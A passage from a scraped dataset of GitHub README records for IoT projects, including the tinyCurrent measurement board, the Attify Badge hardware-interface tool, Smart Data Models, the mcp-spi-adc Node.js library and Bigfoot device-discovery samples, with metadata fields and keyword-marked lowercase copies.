voltage.\nCertifications CE\nMaterials RoHS, REACH\nSimilar to the original uCurrent Gold specs.\nMaximum Ratings\nMaximum supply voltage: 5.5 V\nMaximum current through input ports: 5 A\nIn order to keep the burden voltage low, this device has no OVERLOAD PROTECTION. That means NO FUSES. Care is required in using the unit to prevent damage.\nSchematics and PCB Design\nAll source files are available on Github. The schematics and PCB layout are in Altium Designer format.\nKit Contents\ntinyCurrent PCB and case plus 4 screws\nno battery, you need a CR2032 coin cell battery\nUsage\nIf you supply power via J5, make sure the noise level is lower than the expected output voltage. Too much noise on the supply voltage will render any measurement useless. Usually primary cells (batteries) are the best choice for this.\nConnect the device under test in loop on the low side so that the current flow is from + to -.\nConnect a suitable voltage measurement device such as a DMM or an Oscilloscope on the output side.\nTurn on the device and read the current on the voltage measurement device in the mV range as if it were mA/\u00b5A/nA.\nWhere to buy?\nPick it up ready to use from the n-fuse website.\nLicenses\nCircuit Schematics\nThe circuit schematics of this project are made available under the CC-BY-SA license.\nHardware Design\nOpen source hardware.\nMiscellenious\nData sheets, Altium libraries, 3D Models are subject to vendor specific licensing.", "link": "https://github.com/nfhw/tinycurrent", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tinycurrent \u2013 an enhanced ucurrent gold derivative\na low cost yet professional low current measurement shunt and amplifier combination to overcome the issue of high burden voltage as seen with multimeters and to enable low current measurement by using voltage measurement devices such as oscilloscopes.\noriginally designed and sold by dave jones on the eevblog, this derivative has several enhancements specifically for measuring varying currents on today's low power devices. switch mode voltage regulators and the varying current draw of mcus and rf chips require the determination of the current draw over time to calculate the total power consumption of a device. a storage oscilloscope is a perfect -----> tool !!!  for this task and widely available. that's why the tinycurrent features a bnc connector to reduce the picked-up noise while measuring with an and oscilloscope. another problem is the high dynamics in power draw caused by the aforementioned reasons. this is addressed by the possibility to power the device from an external source with up to 5.5 v and bridge r7 using j6 to use the whole positive vdd as maximum positive output voltage. both measures combined lead to almost 3 times higher dynamic range.\nmodifications to the original design\nhighlights\nadded bnc output for lower noise when acquiring data with a high input impedance instruments like an oscilloscope. the effect is lower noise compared to normal banana leads. see all scope shots for comparison.\nadded a 2-pin 1.25 mm jst zh style male header for powering the device externally to better use the device in permanent measurement setups. only use without battery.\nallow device to be fed with supply voltage of up to 5.5 v to increase the dynamic range (only when external power source us used).\nadded header j6 which allows to install a tht resistor or bond wire to change the ratio of the voltage divider r6/ r7 to increase the dynamic range for positive currents. r6/ r7 have a ratio of 1/ 5 to allow for a max. positive output voltage of ~80% of the supply voltage.\n\"r-variant\" with reversed bnc connector optimized for attaching the device directly to an oscilloscope's input via a bnc-to-bnc adapter.\nother differences\nincreased width of some traces\ncase and board shape to fit case\nremoved test traces on pcb on all 4 corners as they are antennas\nslide switches with lower current rating than in original design \u2192 tests have shown that the used switch can easily handle 5v/ 6a which should be far enough for this device\nshunt resistor r9 has 0.05% greater tolerance \u2192 parts are hand selected using 7 1/2 digit dmm with 4 wire measurement in 100 ohm range\npads for c5, c6 to fit caps on the virtual ground rails to prevent oscillation with capacitive loads\nsome other bom changes without negative implications\nspecifications\nmin/max current per range\ndynamic range in general, the dynamic range in one direction can be determined by:\nvdd / 2 - 200 mv (security margin) = x mv. in case of vgnd = vdd / 2.\n@2.9v vdd (mean battery voltage over usage time)\nna \u00b1 1250 na (20 \u00b5v / na burden voltage typical), contact resistance plays a role here. 10 \u00b5v due to the shunt resistor.\n\u00b5a \u00b1 1250 \u00b5a (10 \u00b5v / \u00b5a burden voltage)\nma \u00b1 1250 ma (10 \u00b5v / ma burden voltage)\n@5.5v vdd (from external power source)\nna \u00b1 2550 na (20 \u00b5v / na burden voltage typical), contact resistance plays a role here. 10 \u00b5v due to the shunt resistor.\n\u00b5a \u00b1 2550 \u00b5a (10 \u00b5v / \u00b5a burden voltage)\nma \u00b1 2550 ma (10 \u00b5v / ma burden voltage)\nresolution in na range 1000 pa on a 3.5 digit dmm\n100 pa on 4.5 digit dmm\n10 pa 5.5 digit dmm\naccuracy, typical < \u00b10.05% on \u00b5a and na ranges\n< \u00b10.1% on ma range\noutput offset voltage, maximum < \u00b130 \u00b5v\ntemperature drift < 10 ppm / degc (\u00b5a / na)\n< 15 ppm / degc (ma)\nnoise < -90 dbv\nthd < -60 db\nbandwidth (-3 db) 300 khz\npower supply cr2032 lithium coin cell or max 5.5 v through connector j5\nbattery life >50 hours (battery good led ensures accurate measurement when led is on). 2.65 v cutout voltage.\ncertifications ce\nmaterials rohs, reach\nsimilar to the original ucurrent gold specs.\nmaximum ratings\nmaximum supply voltage: 5.5 v\nmaximum current through input ports: 5 a\nin order to keep the burden voltage low, this device has no overload protection. that means no fuses. care is required in using the unit to prevent damage.\nschematics and pcb design\nall source files are available on github. the schematics and pcb layout are in altium designer format.\nkit contents\ntinycurrent pcb and case plus 4 screws\nno battery, you need a cr2032 coin cell battery\nusage\nif you supply power via j5, make sure the noise level is lower than the expected output voltage. too much noise on the supply voltage will render any measurement useless. usually primary cells (batteries) are the best choice for this.\nconnect the device under test in loop on the low side so that the current flow is from + to -.\nconnect a suitable voltage measurement device such as a dmm or an oscilloscope on the output side.\nturn on the device and read the current on the voltage measurement device in the mv range as if it were ma/\u00b5a/na.\nwhere to buy?\npick it up ready to use from the n-fuse website.\nlicenses\ncircuit schematics\nthe circuit schematics of this project are made available under the cc-by-sa license.\nhardware design\nopen source hardware.\nmiscellenious\ndata sheets, altium libraries, 3d models are subject to vendor specific licensing.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000706, "year": null}, {"Unnamed: 0": 716, "autor": 716, "date": null, "content": "This project is not being maintained anymore. The new tool is located here.\nNEW URL : https://github.com/attify/attify-badge-tool\nattify-badge\nAttify Badge GUI tool to interact over UART, SPI, JTAG, GPIO etc.\nModules\nUART\nGPIO\nSPI\nI2C\nJTAG\nInstall\nchmod +x install.sh\n./install.sh\nRunning the application\nFrom the project directory run python main.py' make sure the python` reffers to python 2.7 and not python 3.5\nTrouble Shooting\nIn case the installer shows errors, try installing it manually.\nIf that doesn't work register an issue on github and we will get back to you ASAP.", "link": "https://github.com/attify/attify-badge", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "this project is not being maintained anymore. the new -----> tool !!!  is located here.\nnew url : https://github.com/attify/attify-badge-tool\nattify-badge\nattify badge gui tool to interact over uart, spi, jtag, gpio etc.\nmodules\nuart\ngpio\nspi\ni2c\njtag\ninstall\nchmod +x install.sh\n./install.sh\nrunning the application\nfrom the project directory run python main.py' make sure the python` reffers to python 2.7 and not python 3.5\ntrouble shooting\nin case the installer shows errors, try installing it manually.\nif that doesn't work register an issue on github and we will get back to you asap.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000716, "year": null}, {"Unnamed: 0": 719, "autor": 719, "date": null, "content": "Smart Data Models\nUmbrella Repository for Data Models\nNote: This Repository does not accept Pull Requests concerning Data Models. Pull Requests concerning Data Models shall be made against the corresponding subject Repository where the data model is located\nLast news\n\ud83c\udfaf Roadmap\nThe availability of widely adopted (de-facto standard) information models is key for creating a global digital single market of interoperable and replicable (portable) smart solutions in multiple domains (smart cities, smart agrifood, smart utilities, smart industry, \u2026). Such models provide an essential element in the common technical ground needed for standards-based open innovation and procurement.\nData Models play a crucial role because they define the harmonised representation formats and semantics that will be used by applications both to consume and to publish data.\nThe FIWARE Foundation IUDX, TM Forum and OASC and other entities to join, are leading a joint collaboration program to support the adoption of a reference architecture and compatible common data models that underpin a digital market of interoperable and replicable smart solutions in multiple sectors, starting with smart cities.\nThe Reference Architecture and Data Models use the ETSI NGSI API and TM Forum Open APIs for interoperability and scalability of smart solutions. The FIWARE Context Broker technology, implementing the ETSI NGSI APIs (NGSI v2 and NGSI-LD), provides the basis for breaking information silos in organizations aiming at becoming smart. Actually, it enables a real-time (or close to real time, i.e., right-time) view and foundation for the development of governance systems at global organization level. Examples of such organizations include cities, factories, hospitals, airports, farms, etc.\nCombined with TM Forum Open APIs, data publication platforms can support organizations to realise the potential of real-time (or right-time) open data, easing development of innovative solutions by third parties. In addition, organizations can evolve their current data sharing policies towards a vision which, shared with other organizations, brings support to a Data Economy. This way, the proposed Reference Architecture is ready to solve the needs of organizations today while future-proofing for tomorrow\u2019s requirements.\nThis GitHub organization structure contains JSON Schemas and documentation on Smart Data Models for different Smart Domains. The following repositories are available:\ndata-models repository which is an umbrella repository that contains all the Data Models from different verticals (e.g., Parking, Street lighting, etc.). This Repository only admit Pull Requests for templates and general documentation and not for data models.\nFor each Domain (industrial sector) there is a Repository containing as submodules the link to the Subjects containing all the Data Models related. And some other shared elements for all the domain.\nFor each Vertical(Subject) there is a Repository containing the Data Models related to that vertical. These repositories do admit pull requests regardign data models.\nGeneral Principles\nDriven-by-implementation approach: Specifications will be considered stable as soon as enough end user organizations (i.e., cities) have validated them in practice.\nOpen-closed. Breaking changes to already approved specs are not allowed. Instead, new versions shall deprecate attributes, add new attributes, extend enumerations, etc.\nPublic and royalty-free nature of specifications. Data Model Licensing mode. Preferred Creative Commons by Attribution 4.0\nOpen contribution. Contributions open to anybody (not only members), while final decision making corresponds to the administrators of the domains and Subjects. Steerin board could opposed to some contributions if it does not meet coding guidelines.\nLifecycle\nSpecifications evolve over time through versions generated by the contributors in the communities of every Subject. A minimum of a version each year is recommended. The parameter schemaVersion in the schema denotes the version.\nThe way to handle new Data Models is administrated by the different subjects and domains:\nSteering board (currently, FIWARE foundation, IUDX, OASC and TMForum) will check for the consistency and updating of the different data models in this group of repositories. This sterring board will grow in coming dates.\nHow to contribute\nContributions should come in the form of pull requests made against the corresponding Vertical Data Model repository. An introductory presentation about it.\nAs an alternative it is also possible to request a new data model choose option new data model in the dropdown list.\nA Data Model will contain the following artefacts in this structure:\ndataModel/\nREADME.md: Pointing to the schema, the specifications in different formats and languages, etc information This README.md is generated automatically\nschema.json: The JSON Schema definition. It includes in the description of every property the type of property, the model, the valid values and some other elements according to the contribution manual\nnotes.yaml: Optional. File for customizing the specification of the data model.\nLICENSE.md. Templated document with the text of the license default CC-BY 4.0 - schemaDTDL.json: The export of JSON Schema definition into langauge DTDL.\n/doc. This directory contains the specifications of the data model in the different languages. They are generated automatically out of the json schema.\n/examples. This directory contains the examples for the different versions of NGSI standard and different formats. Example: schema.json of WeatherObserved - example.json: a JSON example file key values of NGSI v2 Example: example.json of WeatherObserved - example-normalized.json: An example file in NGSI v2 normalized format Example: example-normalized.json of WeatherObserved - example.jsonld: a JSON example file key values of NGSI LD Example: example.json of WeatherObserved - example-normalized.jsonld: A JSON example file in NGSI-LD normalized format Example: example-normalized-ld.jsonld of WeatherObserved\nADOPTERS.yaml. Templated document with references a actual adoption of the data model.\nOther files automatically generated\nexamplexxx.csv: Automatically generated examples of the data model exported to csv format and located in the /examples directory\nmodel.yaml: Automatically generated model exported from schema.json. Only descriptions are completed manually (if not set in schema). Located in the root directory.\nswagger.yaml: Automatically generated opbject to be visualized in swagger editor. Located in the root directory.\nTo facilitate contributions and their validation, we developed:\njson schema validator for validating that the documented properties are complete and compliant with the contribution manual\nTo achieve a better performance, we need to break down silo\u2019s of data, ensuring that artificial intelligence can be applied across aggregated datasets and to ensure that individual citizen experience can be optimized across different services.\nTo achieve this, TM Forum and FIWARE launched this initiative, later IUDX adn OASC has joined it which seeks to harmonize data models across Smart applications. Other organizations are pending to join.\nBy agreeing across different communities, the common definition of smart data models, this will empower innovators and companies to develop solutions that adhere to this common definition and ultimately help enable interoperability of services.\nFull list of Data Models\nA full list of the data models in json format can be found in the file official_list_data_models.json. Further details on the avaialble subjects, properties and their descriptions can be found at the search tool\nApplication Domains\nThere are new data models in progress for the following application domains (sectors):\nCross Sector\nSmart Agrifood\nSmart Cities\nSmart Energy\nSmart Environment\nSmart Sensoring\nSmart Water\nSmart Destination\nSmart Aeronautics\nSmart Robotics\nSmart Health\nSmart Manufacturing (Just opened)\nA frontend web page provides global updates on the Smart data models.\nAdditionally there is a repository for drafting data models named incubated where anybody (under request) can draft data models that later can submit by PR or any other method. This repo isopen to collaboration.\ngeneral contact mail contact", "link": "https://github.com/smart-data-models/data-models", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "smart data models\numbrella repository for data models\nnote: this repository does not accept pull requests concerning data models. pull requests concerning data models shall be made against the corresponding subject repository where the data model is located\nlast news\n\ud83c\udfaf roadmap\nthe availability of widely adopted (de-facto standard) information models is key for creating a global digital single market of interoperable and replicable (portable) smart solutions in multiple domains (smart cities, smart agrifood, smart utilities, smart industry, \u2026). such models provide an essential element in the common technical ground needed for standards-based open innovation and procurement.\ndata models play a crucial role because they define the harmonised representation formats and semantics that will be used by applications both to consume and to publish data.\nthe fiware foundation iudx, tm forum and oasc and other entities to join, are leading a joint collaboration program to support the adoption of a reference architecture and compatible common data models that underpin a digital market of interoperable and replicable smart solutions in multiple sectors, starting with smart cities.\nthe reference architecture and data models use the etsi ngsi api and tm forum open apis for interoperability and scalability of smart solutions. the fiware context broker technology, implementing the etsi ngsi apis (ngsi v2 and ngsi-ld), provides the basis for breaking information silos in organizations aiming at becoming smart. actually, it enables a real-time (or close to real time, i.e., right-time) view and foundation for the development of governance systems at global organization level. examples of such organizations include cities, factories, hospitals, airports, farms, etc.\ncombined with tm forum open apis, data publication platforms can support organizations to realise the potential of real-time (or right-time) open data, easing development of innovative solutions by third parties. in addition, organizations can evolve their current data sharing policies towards a vision which, shared with other organizations, brings support to a data economy. this way, the proposed reference architecture is ready to solve the needs of organizations today while future-proofing for tomorrow\u2019s requirements.\nthis github organization structure contains json schemas and documentation on smart data models for different smart domains. the following repositories are available:\ndata-models repository which is an umbrella repository that contains all the data models from different verticals (e.g., parking, street lighting, etc.). this repository only admit pull requests for templates and general documentation and not for data models.\nfor each domain (industrial sector) there is a repository containing as submodules the link to the subjects containing all the data models related. and some other shared elements for all the domain.\nfor each vertical(subject) there is a repository containing the data models related to that vertical. these repositories do admit pull requests regardign data models.\ngeneral principles\ndriven-by-implementation approach: specifications will be considered stable as soon as enough end user organizations (i.e., cities) have validated them in practice.\nopen-closed. breaking changes to already approved specs are not allowed. instead, new versions shall deprecate attributes, add new attributes, extend enumerations, etc.\npublic and royalty-free nature of specifications. data model licensing mode. preferred creative commons by attribution 4.0\nopen contribution. contributions open to anybody (not only members), while final decision making corresponds to the administrators of the domains and subjects. steerin board could opposed to some contributions if it does not meet coding guidelines.\nlifecycle\nspecifications evolve over time through versions generated by the contributors in the communities of every subject. a minimum of a version each year is recommended. the parameter schemaversion in the schema denotes the version.\nthe way to handle new data models is administrated by the different subjects and domains:\nsteering board (currently, fiware foundation, iudx, oasc and tmforum) will check for the consistency and updating of the different data models in this group of repositories. this sterring board will grow in coming dates.\nhow to contribute\ncontributions should come in the form of pull requests made against the corresponding vertical data model repository. an introductory presentation about it.\nas an alternative it is also possible to request a new data model choose option new data model in the dropdown list.\na data model will contain the following artefacts in this structure:\ndatamodel/\nreadme.md: pointing to the schema, the specifications in different formats and languages, etc information this readme.md is generated automatically\nschema.json: the json schema definition. it includes in the description of every property the type of property, the model, the valid values and some other elements according to the contribution manual\nnotes.yaml: optional. file for customizing the specification of the data model.\nlicense.md. templated document with the text of the license default cc-by 4.0 - schemadtdl.json: the export of json schema definition into langauge dtdl.\n/doc. this directory contains the specifications of the data model in the different languages. they are generated automatically out of the json schema.\n/examples. this directory contains the examples for the different versions of ngsi standard and different formats. example: schema.json of weatherobserved - example.json: a json example file key values of ngsi v2 example: example.json of weatherobserved - example-normalized.json: an example file in ngsi v2 normalized format example: example-normalized.json of weatherobserved - example.jsonld: a json example file key values of ngsi ld example: example.json of weatherobserved - example-normalized.jsonld: a json example file in ngsi-ld normalized format example: example-normalized-ld.jsonld of weatherobserved\nadopters.yaml. templated document with references a actual adoption of the data model.\nother files automatically generated\nexamplexxx.csv: automatically generated examples of the data model exported to csv format and located in the /examples directory\nmodel.yaml: automatically generated model exported from schema.json. only descriptions are completed manually (if not set in schema). located in the root directory.\nswagger.yaml: automatically generated opbject to be visualized in swagger editor. located in the root directory.\nto facilitate contributions and their validation, we developed:\njson schema validator for validating that the documented properties are complete and compliant with the contribution manual\nto achieve a better performance, we need to break down silo\u2019s of data, ensuring that artificial intelligence can be applied across aggregated datasets and to ensure that individual citizen experience can be optimized across different services.\nto achieve this, tm forum and fiware launched this initiative, later iudx adn oasc has joined it which seeks to harmonize data models across smart applications. other organizations are pending to join.\nby agreeing across different communities, the common definition of smart data models, this will empower innovators and companies to develop solutions that adhere to this common definition and ultimately help enable interoperability of services.\nfull list of data models\na full list of the data models in json format can be found in the file official_list_data_models.json. further details on the avaialble subjects, properties and their descriptions can be found at the search -----> tool !!! \napplication domains\nthere are new data models in progress for the following application domains (sectors):\ncross sector\nsmart agrifood\nsmart cities\nsmart energy\nsmart environment\nsmart sensoring\nsmart water\nsmart destination\nsmart aeronautics\nsmart robotics\nsmart health\nsmart manufacturing (just opened)\na frontend web page provides global updates on the smart data models.\nadditionally there is a repository for drafting data models named incubated where anybody (under request) can draft data models that later can submit by pr or any other method. this repo isopen to collaboration.\ngeneral contact mail contact", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000719, "year": null}, {"Unnamed: 0": 720, "autor": 720, "date": null, "content": "mcp-spi-adc\nMCP3002/4/8, MCP3201/2/4/8 and MCP3304 SPI analog to digital conversion with Node.js on Linux boards like the Raspberry Pi or BeagleBone.\nmcp-spi-adc supports Node.js versions 10, 12, 14, 15 and 16.\nContents\nInstallation\nUsage\nSupported Devices\nAPI Documentation\nInstallation\nnpm install mcp-spi-adc\nIn order to use mcp-spi-adc SPI must be enabled. How SPI is enabled varies from board to board. For example, on the Raspberry Pi the raspi-config tool can be used enable SPI. On the BeagleBone Black the config-pin utility can be used.\nUsage\nDetermine the temperature using a TMP36 analog temperature sensor wired to channel 5 on an MCP3008 SPI A/D converter.\nconst mcpadc = require('mcp-spi-adc');\nconst tempSensor = mcpadc.open(5, {speedHz: 20000}, err => {\nif (err) throw err;\nsetInterval(_ => {\ntempSensor.read((err, reading) => {\nif (err) throw err;\nconsole.log((reading.value * 3.3 - 0.5) * 100);\n});\n}, 1000);\n});\nNote how the optional configuration option speedHz is used to configure the SPI clock frequency in Hertz for reading the value from the TMP36 temperature sensor. The default SPI clock frequency for the MCP3008 is 1350000Hz but lowering it to 20000Hz gives a more acurate temperature reading. In general, it's not necessary to lower the clock speed to read a value.\nThe default clock speed of 1350000Hz for the MCP3008 is derived from the MCP3008 datasheet. The maximum sampling rate at VDD = 2.7V is 75 ksps and each sample requires an 18-bit transfer. 75000 x 18 = 1350000. 1350000Hz is a conservative frequency in the above circuit as VDD is 3.3V.\nSupported Devices\nDevice Channels Channel Numbers Default Clock Frequency Resolution Raw Value Range\nMCP3002 2 0-1 1200000Hz 10-bit 0-1023\nMCP3004 4 0-3 1350000Hz 10-bit 0-1023\nMCP3008 8 0-7 1350000Hz 10-bit 0-1023\nMCP3201 1 0 800000Hz 12-bit 0-4095\nMCP3202 2 0-1 900000Hz 12-bit 0-4095\nMCP3204 4 0-3 1000000Hz 12-bit 0-4095\nMCP3208 8 0-7 1000000Hz 12-bit 0-4095\nMCP3304 8 0-7 1050000Hz 13-bit 0-4095\nAPI Documentation\nAll methods are asynchronous and take a completion callback as their last argument. The arguments passed to the completion callback depend on the method, but the first argument is always reserved for an exception. If the operation was completed successfully, then the first argument will be null or undefined.\nFunctions\nopenMcp3002(channel[, options], cb)\nopenMcp3004(channel[, options], cb)\nopenMcp3008(channel[, options], cb)\nopenMcp3201(channel[, options], cb)\nopenMcp3202(channel[, options], cb)\nopenMcp3204(channel[, options], cb)\nopenMcp3208(channel[, options], cb)\nopenMcp3304(channel[, options], cb)\nopen(channel[, options], cb) - alias for openMcp3008(channel[, options], cb)\nClass AdcChannel\nadcChannel.read(cb)\nadcChannel.close(cb)\nopenMcp3002(channel[, options], cb)\nopenMcp3004(channel[, options], cb)\nopenMcp3008(channel[, options], cb)\nopenMcp3201(channel[, options], cb)\nopenMcp3202(channel[, options], cb)\nopenMcp3204(channel[, options], cb)\nopenMcp3208(channel[, options], cb)\nopenMcp3304(channel[, options], cb)\nopen(channel[, options], cb) - alias for openMcp3008(channel[, options], cb)\nchannel - the number of the channel to open, see channel numbers in supported devices\noptions - an optional object specifying channel configuration options\ncb - completion callback\nAsynchronous open. Returns a new AdcChannel object. The completion callback gets one argument (err). The AdcChannel object returned should not be used before the completion callback is called.\nThe following channel configuration options are supported:\nbusNumber - the SPI bus number, 0 for /dev/spidev0.n, 1 for /dev/spidev1.n, ..., default 0\ndeviceNumber - the SPI device number, 0 for /dev/spidevn.0, 1 for /dev/spidevn.1, ..., default 0\nspeedHz - a number representing the SPI clock frequency for reading from the channel in Hertz, see default clock frequency in supported devices\nadcChannel.read(cb)\ncb - completion callback\nAsynchronous read. The completion callback gets two arguments (err, reading). The reading argument is an object with the following properties:\nvalue - the value read from the channel scaled to a value between 0 and 1\nrawValue - the value read from the channel, see raw value range in supported devices\nReturns this.\nadcChannel.close(cb)\ncb - completion callback\nAsynchronous close. Frees system resources used by this instance. The completion callback gets one argument (err). Returns null.", "link": "https://github.com/fivdi/mcp-spi-adc", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mcp-spi-adc\nmcp3002/4/8, mcp3201/2/4/8 and mcp3304 spi analog to digital conversion with node.js on linux boards like the raspberry pi or beaglebone.\nmcp-spi-adc supports node.js versions 10, 12, 14, 15 and 16.\ncontents\ninstallation\nusage\nsupported devices\napi documentation\ninstallation\nnpm install mcp-spi-adc\nin order to use mcp-spi-adc spi must be enabled. how spi is enabled varies from board to board. for example, on the raspberry pi the raspi-config -----> tool !!!  can be used enable spi. on the beaglebone black the config-pin utility can be used.\nusage\ndetermine the temperature using a tmp36 analog temperature sensor wired to channel 5 on an mcp3008 spi a/d converter.\nconst mcpadc = require('mcp-spi-adc');\nconst tempsensor = mcpadc.open(5, {speedhz: 20000}, err => {\nif (err) throw err;\nsetinterval(_ => {\ntempsensor.read((err, reading) => {\nif (err) throw err;\nconsole.log((reading.value * 3.3 - 0.5) * 100);\n});\n}, 1000);\n});\nnote how the optional configuration option speedhz is used to configure the spi clock frequency in hertz for reading the value from the tmp36 temperature sensor. the default spi clock frequency for the mcp3008 is 1350000hz but lowering it to 20000hz gives a more acurate temperature reading. in general, it's not necessary to lower the clock speed to read a value.\nthe default clock speed of 1350000hz for the mcp3008 is derived from the mcp3008 datasheet. the maximum sampling rate at vdd = 2.7v is 75 ksps and each sample requires an 18-bit transfer. 75000 x 18 = 1350000. 1350000hz is a conservative frequency in the above circuit as vdd is 3.3v.\nsupported devices\ndevice channels channel numbers default clock frequency resolution raw value range\nmcp3002 2 0-1 1200000hz 10-bit 0-1023\nmcp3004 4 0-3 1350000hz 10-bit 0-1023\nmcp3008 8 0-7 1350000hz 10-bit 0-1023\nmcp3201 1 0 800000hz 12-bit 0-4095\nmcp3202 2 0-1 900000hz 12-bit 0-4095\nmcp3204 4 0-3 1000000hz 12-bit 0-4095\nmcp3208 8 0-7 1000000hz 12-bit 0-4095\nmcp3304 8 0-7 1050000hz 13-bit 0-4095\napi documentation\nall methods are asynchronous and take a completion callback as their last argument. the arguments passed to the completion callback depend on the method, but the first argument is always reserved for an exception. if the operation was completed successfully, then the first argument will be null or undefined.\nfunctions\nopenmcp3002(channel[, options], cb)\nopenmcp3004(channel[, options], cb)\nopenmcp3008(channel[, options], cb)\nopenmcp3201(channel[, options], cb)\nopenmcp3202(channel[, options], cb)\nopenmcp3204(channel[, options], cb)\nopenmcp3208(channel[, options], cb)\nopenmcp3304(channel[, options], cb)\nopen(channel[, options], cb) - alias for openmcp3008(channel[, options], cb)\nclass adcchannel\nadcchannel.read(cb)\nadcchannel.close(cb)\nopenmcp3002(channel[, options], cb)\nopenmcp3004(channel[, options], cb)\nopenmcp3008(channel[, options], cb)\nopenmcp3201(channel[, options], cb)\nopenmcp3202(channel[, options], cb)\nopenmcp3204(channel[, options], cb)\nopenmcp3208(channel[, options], cb)\nopenmcp3304(channel[, options], cb)\nopen(channel[, options], cb) - alias for openmcp3008(channel[, options], cb)\nchannel - the number of the channel to open, see channel numbers in supported devices\noptions - an optional object specifying channel configuration options\ncb - completion callback\nasynchronous open. returns a new adcchannel object. the completion callback gets one argument (err). the adcchannel object returned should not be used before the completion callback is called.\nthe following channel configuration options are supported:\nbusnumber - the spi bus number, 0 for /dev/spidev0.n, 1 for /dev/spidev1.n, ..., default 0\ndevicenumber - the spi device number, 0 for /dev/spidevn.0, 1 for /dev/spidevn.1, ..., default 0\nspeedhz - a number representing the spi clock frequency for reading from the channel in hertz, see default clock frequency in supported devices\nadcchannel.read(cb)\ncb - completion callback\nasynchronous read. the completion callback gets two arguments (err, reading). the reading argument is an object with the following properties:\nvalue - the value read from the channel scaled to a value between 0 and 1\nrawvalue - the value read from the channel, see raw value range in supported devices\nreturns this.\nadcchannel.close(cb)\ncb - completion callback\nasynchronous close. frees system resources used by this instance. the completion callback gets one argument (err). returns null.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000720, "year": null}, {"Unnamed: 0": 731, "autor": 731, "date": null, "content": "The Bigfoot project\nA toolbet for IoT software tools that work together.\nDiscover devices automatically\nHave pre-made or many compatible user interfaces\nSimple, lightweight APIs\nHow does it work?\nGet started\nThis guide will allow you to mock up your first connected device in less than a minute.\nDownload Yeti Smart Home\nAny Bigfoot-compatible software would work. Bigfoot is currently fairly young, so this is the first end user software tool that supports it. You can also contribute IoT open source software as part of the Netbeast Dashboard to implement Bigfoot.\nChoose a sample scaffold from the Bigfoot Project.\ngit clone https://github.com/netbeast/bigfoot-node\ncd bigfoot-node/samples/mock-device\nnpm install\nnpm start\nThis is a sample in node.js. There are also samples in bigfoot-golang and python. We are looking for collaborators to create samples in other languages such as lua. Please send us a pull request!\nExplore devices in Yeti\nDone \ud83d\udc4f\ud83c\udffd\nDiscovery\nAllow your device to be discovered by Yeti or any other Bigfoot client.\nvar Server = require('node-ssdp').Server\nserver = new Server({\nsourcePort: 1900,\nudn: 'my-unique-string-identidier',\n})\nserver.addUSN('bigfoot:all')\nserver.start()\nprocess.on('exit', function() {\nserver.stop() // advertise shutting down and stop listening\n})\nCheck out the repo for examples in golang, python or other languages.\nCongratulations, your device is alive!\nAt the right you have the bare values of your device. It still has no functionality, so it will fail when you try to control it.\nLet's keep learning...\nPing\nThis is intended to be the most lightweight method to check that connectivity to your accessory works. If you implement an interface through HTTP (as described in skills) we'd only need to specify the port where the service is running as the location parameter:\nconst Ssdp = require('node-ssdp')\nconst express = require('express')\nconst app = express()\n// respond with \"hello world\" when a GET request is made to the homepage\napp.get('/', function (req, res) {\nres.send('hello world')\n})\nconst httpServer = app.listen(3000, function () {\nconst addr = httpServer.address().address\nconst port = httpServer.address().port\nconsole.log('\ud83d\udc7e Bigfoor ping sample started on %s:%s', addr, port)\nssdpServer = new Ssdp.Server({\nlocation: `${addr}:${port}`,\nsourcePort: 1900,\n})\nssdpServer.addUSN('bigfoot:all')\nssdpServer.start()\n})\nprocess.on('exit', function() {\nssdpServer.stop() // advertise shutting down and stop listening\napp.stop() // close express server\n})\nAs you'd notice already, our device is still pretty dumb. We can only see it appears in our Yeti (Bigfoot compatible) device. This is because we had not specified any skill or topic that it can work as. So let's move on now.\nSkills\nWith skills we plan to refer the capabilities of what an accessory can do. For example, the simplest interface we can implement is a webview for Bigfoot compatible software:\n// node/samples/webapp\nconst Ssdp = require('node-ssdp')\nconst express = require('express')\nconst ip = require('ip')\nconst app = express()\n// Serve a web application to use as user interface or show data\napp.use(express.static('public'))\nconst httpServer = app.listen(3000, function () {\nconst addr = httpServer.address().address\nconst port = httpServer.address().port\nconsole.log('\ud83d\udc7e Bigfoot webapp example started on %s:%s', addr, port)\nssdpServer = new Ssdp.Server({\nlocation: `http://${ip.address()}:${port}`,\nudn: 'Bigfoot_very-unique-bigfoot',\nsourcePort: 1900,\n})\nssdpServer.addUSN('bigfoot:web')\nssdpServer.start()\n})\nprocess.on('exit', function() {\nssdpServer.stop() // advertise shutting down and stop listening\napp.stop() // close express server\n})\nAfter discovery or a request for your skills descriptor you must be able to communicate the things you are able to do, and let the other parties be aware of them. Skills are grouped in topics, so when you declare a topic every other Bigfoot compatible machine understands how to communicate with it immediately.\nTo declare an interface you'd only need to specify the topic on the USN:\nssdpServer.addUSN('bigfoot:bulb')\n// or\nssdpServer.addUSN('bigfoot:app')\nAnd Bigfoot compatible devices are going to interpret it as different devices.\nAvailable topics\nApp: exposes an app through a webserver, so the developer can implement its own interface\nBridge: a device that can find and talk to other devices\nBulb: to control lightning systems\nMusic : things that can consume\nThermostat: a heat / cold system\nSwitch: a plug or system with two states (on/off)\nSensor: an accessory with a read-only state, with keys and values to display\nImplementing a topic\nTo understand Bigfoot messages you must only implement a protocol to listen to the primitives and then specify it under location. The switch topic is the simplest because you only have to understand ON / OFF set requests and to return the state. This will be done by HTTP POST and GET methods respectively.\n// node/samples/mock-device\nconst Ssdp = require('node-ssdp')\nconst express = require('express')\nvar bodyParser = require('body-parser')\nconst ip = require('ip')\nconst app = express()\nlet state = {\npower: 1,\ncolor: '#ffff00',\nbrightness: 80,\ntemperature: 50,\n}\napp.use(bodyParser.json())\napp.get('/', function (req, res) {\n// Here you can return the switch state\nconsole.log('\\n State requested:')\nconsole.log(state)\nres.json(state)\n})\napp.post('/', function (req, res) {\n// Maybe perform 